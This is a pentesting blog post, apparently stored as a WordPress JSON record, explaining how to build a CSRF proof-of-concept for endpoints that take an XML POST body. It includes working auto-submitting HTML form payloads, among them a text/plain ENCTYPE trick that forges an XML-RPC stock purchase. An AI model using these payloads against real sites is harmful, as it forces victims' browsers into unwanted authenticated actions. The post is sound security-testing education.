{"id":80,"date":"2009-12-06T13:55:20","date_gmt":"2009-12-06T13:55:20","guid":{"rendered":"http:\/\/pentestmonkey.net\/?p=80"},"modified":"2011-08-20T15:38:46","modified_gmt":"2011-08-20T15:38:46","slug":"csrf-xml-post-request","status":"publish","type":"post","link":"https:\/\/pentestmonkey.net\/blog\/csrf-xml-post-request","title":{"rendered":"Cross-Site Request Forgery For POST Requests With An XML Body"},"content":{"rendered":"<p>I recently had cause to create a proof-of-concept for a site that seemed to be vulnerable to Cross-Site Request Forgery (CSRF).\u00a0 I say &#8220;seemed&#8221; because there was no CSRF protection, but I was finding the XML POST body really hard to forge (It was a SOAP \/ XMLRPC type request).<\/p>\n<p>Eventually Sid from <a href=\"http:\/\/www.notsosecure.com\">notsosecure.com<\/a> pointed me in the right direction.\u00a0 The solution is not new, but it&#8217;s interesting if you&#8217;ve never come across this problem before.<\/p>\n<p><!--more--><\/p>\n<h3>What I Was Trying To Achieve<\/h3>\n<p>I wanted to write a malicious web page, which would automatically send a request like the one below when a victim viewed it:<\/p>\n<pre>POST \/createnewuser HTTP\/1.1\r\nHost: site.being.tested.com\r\nCookie: mysessionid=90450874698749829\r\n\r\n&lt;?xml version value='\"1.0\"?&gt;&lt;methodCall&gt;... new creds go here...&lt;\/methodCall&gt;<\/pre>\n<h3>The Stuff That Didn&#8217;t Work<\/h3>\n<p>The most obvious approach is probably to have JavaScript automatically sumbit a form containing a hidden form field.\u00a0 Below is my initial attempt.\u00a0 Note that I stuff the XML into the &#8220;name&#8221; of a POST parameter.<\/p>\n<pre> &lt;FORM action=\"http:\/\/site.being.tested.com\/createnewuser\" METHOD=\"POST\"&gt;\r\n &lt;input type=\"hidden\" name=\"&lt;?xml version...\"&gt;\r\n &lt;\/FORM&gt;\r\n &lt;script&gt;document.forms[0].submit();&lt;\/script&gt;<\/pre>\n<p>This fails for 2 important reasons:<\/p>\n<ol>\n<li>The &#8220;name&#8221; containing my XML gets URL encoded thereby corrupting the body of the POST request<\/li>\n<li>There&#8217;s a stray &#8220;=&#8221; at the end of the request.\u00a0 POST requests bodies are of the form &#8220;name=value&amp;name2=value2&#8221;.\u00a0 Since I specified only a single name with no value, the browser quite rightly appended an &#8220;=&#8221; after the name.<\/li>\n<\/ol>\n<p>So my forged POST request looked something like this:<\/p>\n<pre>POST \/createnewuser HTTP\/1.1\r\nHost: site.being.tested.com\r\nCookie: mysessionid=90450874698749829\r\n\r\n%3C%3Fxml%20version%20value%3D'%221.0%22%3F%3E%3CmethodCall%3E...%20new%20creds%20go%20here...%3C%2FmethodCall%3E=<\/pre>\n<p>No where close!<\/p>\n<p>I also considered JavaScript&#8217;s XMLHttpRequest and Flash&#8217;s XML.Send, but these obviously won&#8217;t work because the request is cross-domain.<\/p>\n<h3>The Solution<\/h3>\n<p><a href=\"http:\/\/www.notsosecure.com\">Sid<\/a> pointed out that\u00a0 Shreeraj Shah presented an elegant solution to this problem in slide 34 of his <a href=\"http:\/\/conference.hackinthebox.org\/hitbsecconf2008kl\/materials\/D2T2%20-%20Shreeraj%20Shah%20-%20Top%2010%20Web%202.0%20Attacks.pdf\">HITB presentation in 2008<\/a>.<\/p>\n<p>To quote from his presentation, the poc should specify an ENCTYPE of\u00a0 &#8220;text\/plain&#8221;:<\/p>\n<pre>&lt;FORM NAME=\"buy\" ENCTYPE=\"text\/plain\"\r\naction=\"http:\/\/trade.example.com\/xmlrpc\/trade.rem\" METHOD=\"POST\"&gt;\r\n&lt;input type=\"hidden\" name='&lt;?xml version'\r\nvalue='\"1.0\"?&gt;&lt;methodCall&gt;&lt;methodName&gt;stocks.buy&lt;\/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;MSFT&lt;\/string&gt;&lt;\/value&gt;&lt;\/param&gt;&lt;param&gt;&lt;value&gt;&lt;double&gt;26&lt;\/double&gt;&lt;\/value&gt;&lt;\/param&gt;&lt;\/params&gt;&lt;\/methodCall&gt;'&gt;\r\n&lt;\/FORM&gt;\r\n&lt;script&gt;document.buy.submit();&lt;\/script&gt;<\/pre>\n<p>This results in a perfectly formatted Cross-Domain XML POST request.\u00a0 The ENCTYPE avoids the body being encoded and he cleverly absorbs the unwanted &#8220;=&#8221; into the XML at a point where we need an &#8220;=&#8221; anyway.<\/p>\n<p>&nbsp;<\/p>\n<p>&nbsp;<\/p>\n","protected":false},"excerpt":{"rendered":"<p>I recently had cause to create a proof-of-concept for a site that seemed to be vulnerable to Cross-Site Request Forgery (CSRF).\u00a0 I say &#8220;seemed&#8221; because there was no CSRF protection, but I was finding the XML POST body really hard to forge (It was a SOAP \/ XMLRPC type request). Eventually Sid from notsosecure.com pointed [&hellip;]<\/p>\n","protected":false},"author":3,"featured_media":0,"comment_status":"open","ping_status":"open","sticky":false,"template":"","format":"standard","meta":[],"categories":[5],"tags":[72,19],"_links":{"self":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/80"}],"collection":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts"}],"about":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/types\/post"}],"author":[{"embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/users\/3"}],"replies":[{"embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/comments?post=80"}],"version-history":[{"count":2,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/80\/revisions"}],"predecessor-version":[{"id":156,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/80\/revisions\/156"}],"wp:attachment":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/media?parent=80"}],"wp:term":[{"taxonomy":"category","embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/categories?post=80"},{"taxonomy":"post_tag","embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/tags?post=80"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]}}